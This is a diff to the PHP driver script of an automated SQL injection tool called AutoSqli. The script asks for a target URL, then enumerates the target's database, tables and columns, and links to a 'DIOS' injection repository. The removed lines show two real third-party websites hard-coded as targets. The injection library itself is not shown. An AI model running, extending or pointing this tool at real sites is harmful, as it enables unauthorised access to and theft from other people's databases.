@@ -3,22 +3,26 @@
 require "lib/AutoSqli.php";
 $autosqli = new AutoSqli();
 
-// $autosqli->setUrl("http://www.easygosg.com/attraction-product.php?id=");
-$autosqli->setUrl("https://www.granesia.co.id/index.php?t=kalkulasi&fol=kalkulasi&f=kalkulasi_form&id=");
+echo "[?] Set Url (ex. http://target.com/index.php?id= ): ";
+$url = trim(fgets(STDIN, 1024));
+AutoSqli::setUrl($url);
 
-echo "[!] Target Url : " . $autosqli->getUrl() . "\n";
+$start = microtime(true);
 
-echo "[!] Prepare to get Columns...\n";
-$autosqli->findnumbercolumn();
+echo "[!] Target Url : " . AutoSqli::getUrl() . "\n";
+AutoSqli::setNumColumns();
 
-if ($autosqli->getnumbercolumn() == false) {
-    echo "Not found number columns or your connection error \n";
-    exit;
-}
+AutoSqli::setDatabase();
+echo "[+] Database: " . AutoSqli::getDatabase() . "\n";
 
-echo "[+] Number Columns: " . $autosqli->getnumbercolumn() . "\n";
+AutoSqli::setTable();
+echo "[+] Table: " . AutoSqli::getTable() . "\n";
 
-echo "[!] Prepare to get Current Database...\n";
-$autosqli->findcurrentdatabase();
+echo "[+] Columns: \n";
+AutoSqli::setColumns();
+AutoSqli::getColumns();
 
-echo "[+] Current Database: " . $autosqli->getcurrentdatabase() . "\n";
+$time_elapsed_secs = round(microtime(true) - $start, 2);
+
+echo "If table blank or not found you can use DIOS: https://github.com/Rizsyad/diosqli \n";
+echo "End Time: $time_elapsed_secs s \n";
